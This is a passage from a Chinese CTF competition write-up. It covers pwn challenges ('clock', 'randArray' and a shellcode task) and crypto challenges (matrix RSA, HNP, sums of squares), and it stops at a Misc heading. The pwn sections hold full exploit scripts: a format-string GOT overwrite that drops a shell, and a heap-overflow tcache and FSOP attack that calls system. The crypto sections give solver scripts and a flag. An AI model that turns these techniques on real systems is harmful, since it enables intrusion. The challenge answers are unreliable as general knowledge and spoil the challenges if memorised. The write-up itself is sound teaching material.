0x12:b'Z'
0x13:b'A'
0x14:b'Z'
0x15:b'A'
0x16:b'R'
0x17:b'R'
0x18:b'^'
0x19:b'_'
0x1a:b'\x0f'
0x1b:b'\x05'
0x1c:b'\xeb'
0x1d:b'\xee'
```

exp.py:

```python
from pwn import *
charset = b'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
p=process('./pwn')
head=open('./head.bin','rb').read()
head_new=head.replace(b'\x01',(1^ord('n')).to_bytes(1,'little'))
exp=open('./exp.bin','rb').read()
exp_new=b''
for i in exp[:-2]:
    if i not in charset:
        exp_new+=(i^ord('n')).to_bytes(1,'little')
    else:
        exp_new+=i.to_bytes(1,'little')
exp_new=exp_new[:9]+(exp_new[9]^ord('n')).to_bytes(1,'little')+exp_new[10:]+(exp[-2]-0x75).to_bytes(1,'little')+(exp[-1]-0x75).to_bytes(1,'little')
# sc= b'hnnnnTYH39ZhnnJNH390T8ChuuaaYoL8w0T8a0T8h0T8j1T8c1T8shflagT1jl6akjojFXSZAZARR01akvy'
p.send(head_new+exp_new)
p.interactive()
```

## 题目：<font style="color:rgb(33, 37, 41);">clock</font>
解题步骤

题目实现了一个小的计时器，漏洞点存在于display_current_time函数，是vsnprintf的格式化字符串漏洞，题目开启了NX保护，但是got表可写。

![image-1730940361674](./assets/image-1730940361674.png)

可以看到有个mprotect函数将整个堆变为可执行。

![image-1730940362173](./assets/image-1730940362173.png)

可以看到有个binsh字符串，说明要劫持puts的got表。且向v7堆中读入shellcode即可。然后使用vsnprintf的格式化字符串将puts的got表劫持为shellcode堆地址。

但是和平常printf不一致的是，vsnprintf并不能泄漏堆地址和栈地址出来，他会将数据存到buffer中。

且vsnprintf的参数使用了va_list结构体，这就造成了v7地址存放到了va_list中，然后使用dynamic field width来进行改写got为shellcode堆地址即可。



```python
from pwn import *

#p = process("./pwn")
p = remote("0.0.0.0",9999)
#p = gdb.debug("./pwn")
context.arch = "amd64"
context.log_level = "debug"

p.recvuntil(b"plz input mprotect code")
p.sendline(b"a")

p.recvuntil(b"Enter your choice:")
p.sendline(b"3")

p.recvuntil(b"You should login first,plz input format:")
#payload1 = b"%4210688x%30$ln"
payload1 = b"%4210688x%33$ln"
p.sendline(payload1)


shellcode = asm(shellcraft.sh())
p.recvuntil(b"input name:")
p.sendline(b"name")
p.recvuntil(b"input pwd:")
p.sendline(b"pwd")

p.recvuntil(b"Enter your choice:")
p.sendline(b"3")

p.recvuntil(b"You should login first,plz input format:")
payload2 = b"%1$*1$x%63$ln"
#payload2 = b"%1$*1$x%60$ln"
p.sendline(payload2)

p.recvuntil(b"input name:")
p.sendline(shellcode)

p.recvuntil(b"input pwd:")
p.sendline(b"pwd")


p.interactive()
```





## 题目：<font style="color:rgb(33, 37, 41);">randArray</font>
解题步骤  
2.35堆题, 保护全开.  
逆向分析, 梳理程序逻辑.

用户首先输入一个随机数种子.  
![image-1730940362841](./assets/image-1730940362841.png)

整体是一个菜单堆体  
![image-1730940363409](./assets/image-1730940363409.png)

可以任意大小的堆空间作为Array缓冲区, 读、写 Array.  
![image-1730940363936](./assets/image-1730940363936.png)

![image-1730940364487](./assets/image-1730940364487.png)  
![image-1730940365360](./assets/image-1730940365360.png)



可以分配堆块并写入, 以及释放  
![image-1730940365855](./assets/image-1730940365855.png)  
![image-1730940366160](./assets/image-1730940366160.png)

有一个洗牌的功能: 随机打乱用户指定长度的部分数组内容.  
![image-1730940366765](./assets/image-1730940366765.png)

在newArray时存在整数溢出, 导致分配的空间远远小于8*arrayLen  
![image-1730940367094](./assets/image-1730940367094.png)  
但editArray时使用相同的表达式, 同样发生溢出, 所以最终分配的缓冲区大小和编辑的缓冲区大小是相同的,不存在问题.showArray同理.  
![image-1730940367634](./assets/image-1730940367634.png)



但是在shuffle的时候, 用户可以指定洗牌的array长度, 导致洗牌的array长度大于缓冲区中的array长度,造成堆溢出.  
![image-1730940368114](./assets/image-1730940368114.png)



这个堆溢出可以同时完成读和写的原语, 通过溢出的洗牌, 将后面堆块的数据交换到Array中, 可以泄露libc地址和堆地址.  
将Array中的数据交换到后面的堆块中, 可以越界写打Tcache Attack.  
注意洗牌时不能破坏chunk头, 并精准控制每一轮洗牌时的数据交换.

这里采用模拟的方式来爆破合适的种子, 如下面的demo.

```python
import ctypes

libdll = ctypes.CDLL("./libc.so.6")

for i in range(4000000):
    # 数组初始化
    li = [i for i in range(15)]
    li.append(0xDEAD)
    li.append(0xBEAF)

    libdll.srand(i);

    # 模拟洗牌过程
    for j in range(17):
        rd = libdll.rand()%17
        tmp = li[rd]
        li[rd] = li[j]
        li[j] = tmp

    # 检测洗牌结果, 得到满足条件的种子i. 
    if li[15] == 0xDEAD and li[16] != 0xBEAF:
        print(i)
        print(li)
        break
```



最终exp: 

```python
#!/usr/bin/python
#  -*- coding: utf-8 -*-
import re
import sys
from pwn import *
import ctypes
context.log_level = 'debug'
context.arch = 'amd64'



# 输入为靶机 IP 和端口以及要验证的 flag
HOST = sys.argv[1]
PORT = sys.argv[2]
# FLAG = sys.argv[3]
promt = "?"

def menu(option):
    io.sendlineafter('op:',str(option))

def newArray(num):
    global promt
    menu(0)
    io.sendlineafter(promt,str(num))

def edit(content):
    global promt
    menu(1)
    io.sendafter(promt,content)

def show():
    global promt
    menu(2)

def shuff(many):
    global promt
    menu(3)
    io.sendlineafter(promt,str(many))


def add(idx,size,content):
    menu(4)
    io.sendlineafter('idx',str(idx))
    io.sendlineafter('size',str(size))
    io.sendafter('content',content)

def delete(idx):
    global promt
    menu(5)
    io.sendlineafter(promt,str(idx))

def over():
    global promt
    menu(6)

def seed(seed):
    global promt
    io.sendlineafter(promt,str(seed))

def getseed():
    libdll = ctypes.CDLL("./libc.so.6")

    for i in range(4000000):
        li = [i for i in range(15)]
        li.append(0xDEAD)
        li.append(0xBEAF)

        libdll.srand(i);
        # libc.srand(47)
        for j in range(17):
            rd = libdll.rand()%17
            tmp = li[rd]
            li[rd] = li[j]
            li[j] = tmp
        
        if li[15] == 0xDEAD and li[16] != 0xBEAF:
            for j in range(17):
                rd = libdll.rand()%17
                tmp = li[rd]
                li[rd] = li[j]
                li[j] = tmp
            
            if li[15] == 0xDEAD and li[16] == 0xBEAF:
                li = [i for i in range(15)]
                li.append(0xDEAD)
                li.append(0xBEAF)
                li.append(0xBEAF)
                li.append(0x1234)

                for j in range(19):
                    rd = libdll.rand()%19
                    tmp = li[rd]
                    li[rd] = li[j]
                    li[j] = tmp
            
                if li[15] == 0xDEAD and li[18] != 0x1234 and li[17] != 0x1234 and li[16] != 0x1234 and li[15] != 0x1234:
                    li = [i for i in range(15)]
                    li.append(0xDEAD)
                    li.append(0xBEAF)

                    for j in range(17):
                        rd = libdll.rand()%17
                        tmp = li[rd]
                        li[rd] = li[j]
                        li[j] = tmp
                    
                    if li[15] == 0xDEAD and li[16] != 0xBEAF:
                        print(i)
                        print(li)
                        break
    return i

# exp 函数
def exp(ip, port):
    global io
    io = remote(ip,int(port))
    # io = process('./randArray')
    LIBC = './libc.so.6'
    libc = ELF(LIBC)

    # seed(getseed())
    seed(1404865)

    newArray(str(0x800000000000000F))

    payload = b''
    for i in range(15):
        payload += p64(i)
    edit(payload)

    # prepare for leak libc
    add(0,0x410,'a');
    add(1,0x410,'a');
    delete(0)

    # leak libc
    shuff(17)
    show()
    io.recvline()
    io.recv(0x30)

    libc_base = u64(io.recv(8)) - 0x21ace0
    io_list_all = libc_base + 0x21b680
    system = libc_base + 0x50d70
    binsh = libc_base + 0x1d8678
    print("libc_base:"+hex(libc_base))


    # restore
    shuff(17)

    #leak heap
    add(0,0x100,'a')
    shuff(19)
    show()
    io.recvline()
    io.recv(0x40)
    heap_base = u64(io.recv(8))-0x310
    print("heap_base:"+hex(heap_base))


    # hijack io_list_all
    add(1,0x100,'a')
    delete(1)
    delete(0)


    payload = flat([0,0,0,0,((heap_base+0x310)>>12)^io_list_all])
    edit(payload)
    shuff(17)

    fake_io_addr = heap_base+0x320

    io_file = flat({
        0x0: '  sh',
        0x18: 0,
        0x28: 1,
        0x30: 0,
        0x68: system,
        0x88: fake_io_addr+0x2000,
        0xa0: fake_io_addr,
        0xd8: libc_base+libc.sym['_IO_wfile_jumps'],
        0xe0: fake_io_addr,
    },filler=b'\x00')

    add(0,0x100,io_file)
    add(1,0x100,p64(fake_io_addr))

    over()
    io.sendline('cat flag')

    # 匹配 FLAG
    match_group = io.recvregex('DASCTF{(.*?)}',capture=True)
    flag = match_group[0].decode()

    return flag


# 主逻辑
if __name__ == '__main__':
    flag = exp(HOST, PORT)
    print(flag)

```

# Crypto
## 题目：<font style="color:rgb(33, 37, 41);">EZmatrix</font>
解题步骤

矩阵RSA

我们知道，对于有限域 $ \mathbb{F}_q $ 上的$  n×n $ 矩阵构成的一般线性群 $ GL(n,Fq) $，其阶数可以通过以下公式计算：

$ ∣GL(n,Fq)∣=(q^n−1)(q^n−q)(q^n−q^2)⋯(q^n−q^{n−1}) $

根据论文 A Matrix Extension of the RSA Cryptosystem Andrew Pangia，我们知道只需要将一般线性群的阶拿去替代原来RSA的$ phi(n) $，就可以以同样的形式实现RSA加解密。

#### 一般线性群的元素的阶
根据论文 Ivan Niven, Fermat theorem for matrices, Duke Math. J. 15 (1948), 823-826  [https://projecteuclid.org/journals/duke-mathematical-journal/volume-15/issue-3/Fermats-theorem-for-matrices/10.1215/S0012-7094-48-01574-9.short](https://projecteuclid.org/journals/duke-mathematical-journal/volume-15/issue-3/Fermats-theorem-for-matrices/10.1215/S0012-7094-48-01574-9.short) 我们知道，在$ \mathbb{F}_p $上，其实就是$ m=1 $,即有：  
$ q_n=LCM(p-1,p^2-1,...,p^n-1) $  
可以把分圆多项式代进去  
$ q_n=LCM(\prod_{d|1}\phi_d(p),\prod_{d|2}\phi_d(p),...,\prod_{d|n}\phi_d(p))=\prod_{i=1}^n\phi_i(p) $

论文中要求$ p^r\geq n&gt;p^{r-1} $，显然我们的r = 1.

最后我们可以得到$ GL(n,\mathbb{F}_p) $的元素的阶应该符合这样的形式：

$ \prod_{d|n}\phi_d(p)=p^n-1 $

该结论证明虽然复杂，但是比较容易搜索到，而且其证明也不是该题目的主要考点，选手只需知道有这个结论即可。若要证明则需要使用特征值及若尔当型，不多赘述。

题目中给出$ e $的大小约为2^4093,约为$ p $和$ q $数量级的8倍，$ d $相对小时$ e $与$ phi $的数量级非常接近，也就是说该题目中这个矩阵的数论阶（幂乘几次为1）的数量级约为$ p $和$ q $的8倍。

我们知道在一般线性群中元素的阶一定符合上述给出的形式，那么$ phi $有最有可能为$ (p^4-1)*(q^4-1) $ ,当然经过测试，也有可能为$ (p^3-1)*(q^5-1) $或者$ (p^2-1)*(q^6-1) $，但是应当考虑到这样的阶的形式是难以换元计算的，故应当最先尝试$ (p^4-1)*(q^4-1) $ 进行二元coppersmith。

#### 二元coppersmith
参数相对很特殊,我们发现d仅有920bit,ed满足以下式子:

$ ed=1+k(p^4-1)(q^4-1) $

因式分解得

$ ed=1+k(p^2+1)(q^2+1)(p-1)(q-1)(p+1)(q+1) $

变换一下,不妨设$ k = x, p^2+q^2 = y $

得到$$ ed=1+x(n^2+y+1)(n^2-y+1) $$

然后copper求解即可.

```python
from sage.all import *
from Crypto.Util.number import *
from gmpy2 import *
import itertools

def small_roots(f, bounds, m=1, d=None):
    if not d:
        d = f.degree()

    R = f.base_ring()
    N = R.cardinality()

    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)

    G = Sequence([], f.parent())
    for i in range(m + 1):
        base = N ^ (m - i) * f ^ i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)

    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)

    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)

    B = B.dense_matrix().LLL()

    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1 / factor)

    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B * monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots

    return []
e =  75759282367368799544583457453768987936939259860144125672621728877894789863642594830153210412190846168814565659154249521465974291737543527734700545818480398345759102651419148920347712594370305873033928263715201812217658781693392922382633382112810845248038459857654576967447255765379492937162044564693535012144718871564964154729561032186045816489683161588345299569985304078255628527588710513640102450308662163641732851643593090646321420800552303398630738674858967724338819227042384745213425656939930135311339542647104499427215254435723921505189649944059658797193927706249542240737884739119223756635540945563449010120382834036979025801446796614280064172405549502694658175837126702821804106928800917035327292099385809060363635737715320709749444795680950552240184529017581997661357846852201424248086080872655164246614710423850620222735225702427025180018637830386631573912505087046428427137407828859500285127835020183526681560129322020299774376860830513167598911105104946612301909005028216010756378307303924865571457872055817289904093797943893894249094212422766513999129665299858860878710920689322752152527130981697461526170099006972245891313788064563118647308122107999430867808150749979046611265769861111738145184897880080810883790769899
n =  99231341424553040688931525316017803824870567327100041969103204566938549582832516706206735181835068382521133899811339836861525260134721134887446163174620592328661881621312114348726944317349680760092960665800660405612177225373482880941142930135489885221592416840149732795379174704611605960303340578163595465083
C =  [(60962492392910372655829579800623350869143417412923809005355225641547310999689300067771076642840347631213921261735160280073159348909580620372515144615183619484116931277062459534426852453669020768212186583219050186476749582255169630649290603191487938394564254993928830585225872994041844749592189414050346998498, 47570494768722430855321464941025696993380565713448923284620084505935271175106089198810572053594395338695564872188782440522323916637635901100372244111566233734761590240981688569861120646443206802056135646056594081150032676095454677651908656653983161086373605006880681566863747858292744224442976621418797205399, 2688181329187093888869457776665971472383024590564085347482816443420850842347573980241749337291795284050213197900458997704783513811033569074013164405426061208943782009246429930688449460037973029867946269202889059604686278471272132218340037450771429686919881716403514347492132483441838117219973263406807217974, 69152734772841729744864181378357911157430121423043131526556925765272499517864120668258106865684921607378129493604079173227751534891590136750575722628168425004031909583828469631788511241718967754283602045554638710656882949816656201393892265416912928916418003936183428716201442550333656679935723677385561024921, 87916597194547447124625284021545845894398798075569904698700457948229723401310121661631733143462834474179528341099541302790092417595967636978700000869424652408571342615122171893834241191682257315189450299073036702171002969055277890180093192346807050020075074678160917020003175299572457770301172013554859610885, 87786307503376954316030650346838348696800737186248037233105303922917125487679342882764384018020917373783494097970572084301842435397667036289687253696282531883479674194433525871169279787175003732384644823866404707423021568914833613783558731218680259786594673087000922732933203580338582174836542335256895112774), (19925935729162396840966340912353714097004160798615839580675147896543197999100114040514331382227016633727621399922875280921939403294675089237685490824481702911947235694589943642920569884248825154743655331893278941153597853907070809496035573765953115001007513406579011860142499904738601402936261081671704883289, 58482679161881651450519578125499657069493057728415805326447380380141486533923095749022382883536937182057631317376727990670863971670749991637396946761762614232393617646003704455294405699238388026259395339494678908761885707645569206191899296873833133914051981244247283254577922595285757876026540914747153605160, 7876769535761750153866264956186319035785652316141088148036849233806135397857747677246966644027825150213665232397824678749874814778004967045900692519991198396803997342682950493474998693632762775853085063006163824393616781789234994435613494739078376441202546497376889898623686582966994626392473756048641752814, 40374752091452840478156903709507048899177048294570218656121556350119195781557565218138424538202862806990185673750490061744496157480684671895195643247659670629323773035075555928457149898576983418457948777991721866891250461708466719417665721953156700367709890061169794698483650373164167487545578780062511325698, 4123966761831135761457937397066767492577970106907260057338733132356073163290362041428543487785541800166623333444500095074624068090394361249458065855973762485004782025486942019551010253665248191341796357273736185376285833313657930327592630423321995683340268803166901859312919131785819655040568361583085676057, 27583730178148494208215582336953731428677655384934947406110969819755861309635715916436503750399886946834588631955424622786954747202685007199149082525818506387606813299614560669074223670606725332129580433663793218302408230595218329795347716963182007259165979155950826829268655927501949206255488502388472700075), (56315845708240095082772501761675446313947442745181474765872020399653138411744471022394674490163519262253419142994958571123783825827944495254330717218087742852853691152509996374039921954037271141012224417462582306680805308244999271694256058220813474581635472407864886498830142166123949972548432270703952960923, 32896154872958176487612097856128071067779298934826306391422436791812001537876365873180665334382055349578758924117227229354892419126981829368419291413849009911423713613087552037524220081917635206657387768281003765094819963853123278586621439766100307324554778715337379588648264826773884692017793176376154675501, 28403727117575806889742293164072634954876499471182701829204385629161049158547263968390684814088323042021380910604906904467751008743919604654911693492973603888427448583482505774314038985928231290890291117425907291509663229092491530818877566758210084483466899541610500708571206332019126409191398637035395635692, 7821951828810668315162755325480202107754899640542890161681114897656891485110009850481857086945730357655734989848039495868447513739566035840945273281198690239884406844038006297455016615584047106189557019820282710249181355660515976689844733069965635239977868606412950428777686615619878916256034858820314322668, 76525192903457309209366743987447032158337732768547571793488111729224008602119438154849638971504949003719786026252648739617917436256435628300010323711153402229164528979259259214627588535459760359253880641429469562048622701982862831594514336875830284504454333566487968184255876886415003174627552219974082980636, 30637464791180430144279994098478365983230561289862073957684155866766012864169717451278445846218491051030419180119954192685431439312797317764656461287947635921370686618109628728836641249249386071858927735736888632316823543835130338563924434711937538665035969023712380857260473274001732469412322752873384968601), (10730358875712453042013970789576402939218800351221446191771233177536009349624025030667973532521911666593354783762941362456771050299436815799063691625091095782507693177746119034551757951243518170991606414822107132916004609627849551446847131359143181119565430368982878108761799084029033027032755115381679417096, 24507369071589713103970720335832744954845520380398828656842561115495704802037030133393011751145702976684589338927049344552393322139237977140642967325628644800492714995845105460369698708659335653391904302955502145025551463160676476446189657801618085294176671181454800483878164016749534940141884944397289890871, 92820108862600030043211342419176390123942091097153321737988513673868731991771619676009296651860321326370172965558922130850493512979555339094561381645396270883677588661828281447106070801829307329117814743685760943125981155705527918307567109500089138120007989551366153992391010620955360882383556542559392894262, 74641576048678849575812629186393953979307695146586927788280165573903662821064189347983936198087197963380651069815352351349775566210254797203960521484844402002602126951649571328507275278196835502471467819034725531964918681611446773963678730681425674462738816516031202042449731753950180027830876790421576081225, 66685821407492303211977447210040267021195326010645045932118328414906080616013267240390961550749369776862683674842903750593917463844615658362977613737130311357170777497628656513144020197746398798679807363859886437403991016453908185102814636772479260178297629433510961788244743608125906745012445887428376915629, 37645288166396858415565430454995281883016537193725289151596326083427351314771501111923193754508050507668744794821015166055917903051072319801945727142824029386542877351207944394255175419467949702189317844980323590614559226315219797417693447676522076956364574845889800486817292590561738321483697160713821529546), (9736711624136652052770116447223295880053359374932369087990200046581983386760557572632286124794444930134179594903564091220200006471388531967010990324827682059485960618855287386961552241259199988445679075595951186424593845864059162998542185539998139746836413273921569266377169025136169016355692767128488900477, 13089476325068401303987570656586592581224347700750455041713556437672762444853346450009029644985692097286649094772508755542691510307531122589433151470493395688605259544275677288082873918929554397272543678133089309672143858040052870098814015145664055945998991679722753687104989489973852117933261358247564988071, 61284598700800926964424249048307178141566077849519756690996988745704530644294308600472621437373651397677668023765897304421576611779363230148263097867987781840048890597647956492658737562151147335685622316577395377277998529914754048562837674418322097396064634364367313407061824216514715793677445932930269152481, 61301319985121628512628256322255391212515053807722664632938090246192955763394429545800696862309263991966900735678875111077481123759702692720133903430321183178233894849098114454863008686201888641863850157441070304164754292432907144839124698488730051010247980425937242664545487287543260612682886985351085138001, 47435322189871012567009786652825469952862610804330828872313845269622590943796389601479086952212526668296575803391674745677862994957044749158154034984601827088557466296368252473168676311089972605318362738347163748086202789713353987691976193103958097243650266229294687864565520648709873760054473254540098351391, 32817913908586741358496040992834207477154835734595147264489781242919114343572982132460531399879345665767073663537263426565698777735998027473421290120433416805825431315476774452072722260737533264180361001819202057517709886953362750990747046346025917668519097056756157788411735612581204089155228884131378072233), (12642425264267098423833241400926732957307073786117649292717736141221694320062979757108242390714162456346780855636174573171779655212347730635821416215537084671118355916330992142141813099104775940725892721614126911510988568345398817554586646066735943804403563179908909629802981392776238272786744291004069356775, 32752716826697049825682788062896730338057604164648704588810956358313907785865814197561208570319757370744105618622052812423057447877481397095444475610617492626525875388680227635541658500637643262806846291312209615044898925278862926827256312481616510480170805540775256088922398310392639344678087647083653765821, 3022511069721965916815622985038080358228403264264831484927372260512043862778138035440859308822033467592971930633307565996150364843965884881400481310689834508879168477508572967173126034539725429899016318805136722734731136521866714013050522337795295311863953350784370773653485436181314864092331268367915892666, 44494293452595159373079306455244053834138260846967620303725161277545981351217523341157156495183639822519882035281721714315331475283644457723353767200184408989752610854962070029226464081899523388838531578296754646973186313035869250105084114692966907900349716132438711767401573694320357418158987949401765528425, 66130193533773704471809811407675367482896080993725170656227230634400122250448911267627547029162335780439769273413020435641724884803365183531498010730643595588304390566255555816793888715047993688213860064650538998545316010718479287163068234420541010586467244361311016741807424118408290204453770332676360498896, 74649855891297747785048523345822478110464591680545397129030301786991725968732851407232435476064324066227685639784066521927825943853534396958155065514682624920312291149309530337681973006060504366672574864594730979571926592855426800301765737184843799883674936189745414847240093702374870446528449267420369306618)]
C = matrix(Zmod(n), C)
#PR.<x,y>=PolynomialRing(Zmod(e))
#f = 1 + x*(n^2-y+1)*(n^2+y+1)
#res = small_roots(f, (2^1000,2^1100),m = 2,d = 3)
#p2q2 = (res[0][1])
#print(p2q2)
#phi = int((n**2-p2q2+1)*(n**2+p2q2+1))
phi =  96960634547170879796546300993162300026479901748198052387556092868354992010652369606340049266540415843679606483297442273024246252778929593204060203364065336052638753284082041408048653026085379533776677135403054497994130215938975498024668905964206474722122410872904367858018481496216705435089573033130164178743110343542050453581339266959846208238234207570094349390880873853849093282758101618892914550626987201351732396075935628640745220307191815380468601045088314045488659836165116754711928552280301891772583422367680286637280704622884558037877459485015874316840457910512292277569824997165477578284017231390826702843250959229098950876746802616425107969783143166642932331613904969102488131654641162352297251445070758207249404048273833523358122259596421231406225089552605576485562698729878577021451029190506874550975150258475757092262785653228408006357007615861943928810985668743118462803720688926157674662809075225749176281495586631704003054822854527568950863305455661691844059321412410945923011840240289256958763582686369901173085374875217844316684166675679446861470065640411458869513655070516926768110766830392651226368416874172402928182593377535735913114156550018877678206529299558401581433744134458182090514460162536894089499136000
d = inverse(e,phi)
#d = 1735224428175865034904904318598318613366933293191028133928432821150015248016683644320488065113791526959968404357040686452151152126601342488619167016018293814487200263055776342974179965610047717348111706605180851818280772647553668477203096453389420363724103096830988700834865022
M = C**d
flag = b""
for i in range(3):
    for j in range(3):
        m = int(M[i,j])
        flag += long_to_bytes(m)
print(flag)
```



## 题目：<font style="color:rgb(33, 37, 41);">EZsignin</font>
解题步骤

1. 阅读代码，发现题目实现了一种基于椭圆曲线的密钥交换，解出Bw即可得到flag
2. 看作Bw的HNP问题，构造格并规约，求出Bw0  
 ![image-1730940368625](./assets/image-1730940368625.png)
3. 保留Bw0高位，解dlp求出Bw低位   
（注意到当Rbar的后35位变化时可能会出现更短的向量，但高35位变化时x%n很难都是2**100量级。所以规约可以求出Bw的高位，Bw的低位通过bsgs或者lambda得到）  
 ![image-1730940369130](./assets/image-1730940369130.png)
4. 解flag ![image-1730940369626](./assets/image-1730940369626.png)
5. [https://eprint.iacr.org/2024/882](https://eprint.iacr.org/2024/882)

## 题目：<font style="color:rgb(33, 37, 41);">EZsquares</font>
解题步骤

1. 分解质因数

使用 yafu 或 [factordb](http://factordb.com)。

可完全分解，分解结果为

```python
factors = [2,37,2843693,37573771429,24355545295939391032086035104664746399809401519183667646864483597373332000132384914701127155332516194158696124998981531509940109637752655512736464015335608239994279430655962034574655784291148129476437092170226561225288611377658356058593422293829559715235372248141136663102802504300965377041]
```

1. 4k+1型质因数的二平方和拆解

> 费马二平方和定理：  
对素数 $ p&gt;2 $，$ p $ 能表示成两个整数的平方和当且仅当 $ p \equiv 1 \space (mod \space 4) $.
>

因此，第一步分解出的所有质因数都必须是2（分解为$ 1^2+1^2 $）或4k+1型的素数方可求解。

参考论文 _Note on Representing a Prime as a Sum of Two Squares_ 可知，将一个4k+1型的素数分解为二平方和需要两个步骤（**Hermite Serret 算法**）:

+ 找出 $ x^2 \equiv -1 \pmod{p} $ 的一个解 $ x_0 $ .
+ 在 $ p/x_0 $ 上执行欧几里得算法，产生余数序列 $ R_1,R_2,... $，直到 $ R_k $ 首先小于 $ \sqrt{p} $ . 那么  
$ \begin{aligned}
p &amp; =R_{k}^{2}+R_{k+1}^{2}, &amp; &amp; \text {如果} \quad R_{1}&gt;1,  \\
&amp; =x_{0}^{2}+1, &amp; &amp; \text {如果} \quad R_{1}=1. 
\end{aligned} $

第一步的简易方法：我们可以用欧拉判别式 $ a^{\frac{p-1}{2}} \equiv\left\{\begin{array}{ll}
1(\bmod p), &amp; (\exists x \in \mathbf{Z}), a \equiv x^{2}(\bmod p), \\
-1(\bmod p), &amp; \text { otherwise. }
\end{array}\right. $ 来判定 $ a $ 是否是模 $ p $ 的二次非剩余。如果是，则我们可以用 $ x_0 \equiv a^{\frac{p-1}{4}}\pmod{p} $ 来计算 $ x_0 $ .

代码如下：

```python
import gmpy2

def prime_solver(p):
    if p == 2:
        return 1,1
    # (i) 寻找二次非剩余
    a = 2
    f = 0
    while not f: 
        m = (p-1)//2
        if pow(a,m,p)>1: # 二次非剩余（欧拉判别法）
            f = 1
            x=pow(a,(m//2),p)
        else:
            a = int(gmpy2.next_prime(a))
    # (ii)
    a = p
    b = x
    while 1: # 欧几里得算法
        if pow(b,2) < p:
            a, b = b, a % b
            break
        a, b = b, a % b
    assert a*a+b*b == p
    return abs(a),abs(b)
```

之后，对每个质因数执行`prime_solver()`函数，结果以元组的形式存贮在`root`列表中。

```python
for f in factors:
    if f % 4 == 1 or f == 2:
        roots.append(prime_solver(f))
    else:
        raise Exception("4k+3!")

# root = [(1, 1), (6, 1), (1258, 1123), (166175, 99798), (4580477557383945198366352534302979712055408497739034806608959404005819871509113349177319078302981430835919140116186735377854470185301346801501696, 1837054882751573661995737949123705720298361280121554747680135551540215462038228259277116171685581704814729514576823242354491205174821409596509975)]
```

1. 合并

> $ (a^2+b^2)(c^2+d^2)=(ac+bd)^2+(ad-bc)^2 $
>

根据以上公式，我们采用**深度优先搜索算法**对root中的元组进行两两组合：

```python
import gmpy2

def judge(n):# 最终分解出的p,q的约束条件
    return gmpy2.is_prime(n) or gmpy2.is_prime(n)

def search(p,q,cnt): # 深搜求解
    global answer
    if cnt == len(factors):
        if judge(p) and judge(q):
            if (p,q) not in answer:
                answer.append((p,q))
        return
    search(p*roots[cnt][0]+q*roots[cnt][1],abs(p*roots[cnt][1]-q*roots[cnt][0]),cnt+1)
    search(p*roots[cnt][1]+q*roots[cnt][0],abs(p*roots[cnt][0]-q*roots[cnt][1]),cnt+1)

answer = []
search(roots[0][0],roots[0][1],1)
search(roots[0][1],roots[0][0],1)
```

由于附件中给的p、q均为质数，我们使用`judge()`函数对深搜的结果进行约束。

最后得到结果为

p = 11902265017193255514381686804589948942351813100767943273349247290945499466994655883435686822454794625831069638735275526469535462413065469698668888764904143

q = 135112612926075174581896396551030270669894577611882325973046002808363480772914355626186650143420888914666635854758972890852967780613146013587765350787907

1. RSA 解密

得知p、q，将其代入RSA解密脚本即可。解密脚本如下：

```python
from Crypto.Util.number import *

def RSAdecode(p,q):
    e = 65537
    c = 1541487946178344665369701061600511101386703525091161664845860490319891364778119340877432325104511886045675705355836238082338561882984242433897307540689460550149990099278522355182552369360471907683216881430656993369902193583200864277424101240184767762679012998894182000556316811264544736356326198994294262682
    n = p * q
    phi = (p - 1) * (q - 1)
    d = gmpy2.invert(e, phi)
    m = pow(c, d, n)
    flag = long_to_bytes(m)
    print(flag)

RSAdecode(answer[0][0],answer[0][1])

# DASCTF{4028d59bb18028e2df8d5d51b376908c}
```

整理exp如下：

```python
import gmpy2
from Crypto.Util.number import *

def prime_solver(p):
    if p == 2:
        return 1,1
    # (i) 寻找二次非剩余
    a = 2
    f = 0
    while not f: 
        m = (p-1)//2
        if pow(a,m,p)>1: # 二次非剩余（欧拉判别法）
            f = 1
            x=pow(a,(m//2),p)
        else:
            a = int(gmpy2.next_prime(a))
    # (ii)
    a = p
    b = x
    while 1: # 欧几里得算法
        if pow(b,2) < p:
            a, b = b, a % b
            break
        a, b = b, a % b
    assert a*a+b*b == p
    return abs(a),abs(b)

def judge(n):# 最终分解出的p,q的约束条件
    return gmpy2.is_prime(n) or gmpy2.is_prime(n)

def search(p,q,cnt): # 深搜求解
    global answer
    if cnt == len(factors):
        if judge(p) and judge(q):
            if (p,q) not in answer:
                answer.append((p,q))
        return
    search(p*roots[cnt][0]+q*roots[cnt][1],abs(p*roots[cnt][1]-q*roots[cnt][0]),cnt+1)
    search(p*roots[cnt][1]+q*roots[cnt][0],abs(p*roots[cnt][0]-q*roots[cnt][1]),cnt+1)

def RSAdecode(p,q):
    e = 65537
    c = 1541487946178344665369701061600511101386703525091161664845860490319891364778119340877432325104511886045675705355836238082338561882984242433897307540689460550149990099278522355182552369360471907683216881430656993369902193583200864277424101240184767762679012998894182000556316811264544736356326198994294262682
    n = p * q
    phi = (p - 1) * (q - 1)
    d = gmpy2.invert(e, phi)
    m = pow(c, d, n)
    flag = long_to_bytes(m)
    print(flag)
    
def exp():
    for f in factors:
        if f%4 == 1 or f == 2:
            roots.append(prime_solver(f))
        else:
            raise Exception("4k+3!")
    search(roots[0][0],roots[0][1],1)
    search(roots[0][1],roots[0][0],1)
    RSAdecode(answer[0][0],answer[0][1])

# factordb.com
factors = [2,37,2843693,37573771429,24355545295939391032086035104664746399809401519183667646864483597373332000132384914701127155332516194158696124998981531509940109637752655512736464015335608239994279430655962034574655784291148129476437092170226561225288611377658356058593422293829559715235372248141136663102802504300965377041]
roots = []
answer = []

if __name__ == "__main__":
    exp()
```

# Misc
## 题目：<font style="color:rgb(33, 37, 41);">ez_minecraft</font>
解题步骤

